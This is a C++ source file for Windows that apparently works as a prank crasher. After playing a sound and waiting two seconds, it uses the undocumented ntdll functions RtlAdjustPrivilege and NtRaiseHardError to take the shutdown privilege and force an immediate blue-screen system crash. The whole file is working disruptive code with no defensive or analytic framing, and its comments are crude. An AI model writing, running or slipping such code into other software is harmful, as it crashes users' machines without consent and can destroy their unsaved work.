#include <Windows.h>
#include <chrono>
#include <thread>


#define DELAYLENGTH 2000

// look at the documentation of this bullshit here: https://undocumented.ntinternals.net/, https://www.pinvoke.net/default.aspx/ntdll.RtlAdjustPrivilege and in the mingw 64 source wdm.h at https://github.com/mirror/mingw-w64/blob/master/mingw-w64-headers/ddk/include/ddk/wdm.h

#define SE_SHUTDOWN_PRIVILEGE 19

enum HARDERROR_RESPONSE_OPTION {
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem
};

typedef NTSTATUS(__stdcall *RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, bool* Enabled);
typedef NTSTATUS(__stdcall *NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, int* Parameters, HARDERROR_RESPONSE_OPTION ResponseOption, int* Response);

int main()
{
	PlaySound(MAKEINTRESOURCE(101), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC);

	std::this_thread::sleep_for(std::chrono::milliseconds(DELAYLENGTH));

	HMODULE libh = LoadLibraryA("ntdll.dll");

	LPVOID adjustPrivilegeAddr = GetProcAddress(libh, "RtlAdjustPrivilege");
	LPVOID raiseErrorAddr = GetProcAddress(libh, "NtRaiseHardError");

	RtlAdjustPrivilege _RtlAdjustPrivilege = (RtlAdjustPrivilege)adjustPrivilegeAddr;
	bool aa;
	_RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, true, false, &aa);

	NtRaiseHardError _NtRaiseHardError = (NtRaiseHardError)raiseErrorAddr;
	int bb;
	_NtRaiseHardError(0xC0000420, 0, 0, 0, HARDERROR_RESPONSE_OPTION::OptionShutdownSystem , &bb); // offset 420 marijuanaise
}
